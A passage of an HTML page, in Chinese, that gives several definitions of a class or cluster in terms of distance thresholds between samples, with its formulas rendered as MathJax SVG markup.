63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></svg></mjx-container>，有<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="7.185ex" height="2.236ex" role="img" focusable="false" viewBox="0 -694 3175.8 988.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="TeXAtom" transform="translate(553,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(345,0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1416.1,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(2471.8,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g></g></svg></mjx-container>，则称G为一个类或簇。</p><p>定义2：设T为给定的正数，若对集合G的任意一个样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.034ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 899 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>，如果存在G中的另一个样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="2.141ex" height="1.666ex" role="img" focusable="false" viewBox="0 -442 946.3 736.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></svg></mjx-container>使得<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="7.185ex" height="2.236ex" role="img" focusable="false" viewBox="0 -694 3175.8 988.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="TeXAtom" transform="translate(553,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(345,0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1416.1,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(2471.8,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g></g></svg></mjx-container>，则称G为一个类或簇。</p><p>定义3：设T为给定的正数，若对集合G中任意一个样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.034ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 899 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>，G中的另一个样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="2.141ex" height="1.666ex" role="img" focusable="false" viewBox="0 -442 946.3 736.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></svg></mjx-container>满足<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -1.116ex" xmlns="http://www.w3.org/2000/svg" width="19.376ex" height="3.073ex" role="img" focusable="false" viewBox="0 -864.9 8564.4 1358.4"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(933,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mrow" transform="translate(220,-345) scale(0.707)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(633,-150) scale(0.707)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g></g><g data-mml-node="mo" transform="translate(1238.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2016.8,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><rect width="1979.6" height="60" x="120" y="220"></rect></g><g data-mml-node="munder" transform="translate(2386.3,0)"><g data-mml-node="mo"><path data-c="2211" d="M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z"></path></g><g data-mml-node="TeXAtom" transform="translate(1089,-285.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(946.3,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mi" transform="translate(1613.3,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g></g></g><g data-mml-node="msub" transform="translate(5388.6,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="TeXAtom" transform="translate(553,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(345,0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g><g data-mml-node="mo" transform="translate(6804.6,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(7860.4,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g></g></svg></mjx-container>，其中<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="2.803ex" height="1.375ex" role="img" focusable="false" viewBox="0 -442 1238.8 607.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(633,-150) scale(0.707)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g></g></g></g></svg></mjx-container>为G中样本的个数，则称G为一个类或簇。</p><p>定义4：设T和V为给定的两个正数，如果集合G中任意两个样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="5.181ex" height="1.666ex" role="img" focusable="false" viewBox="0 -442 2289.9 736.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 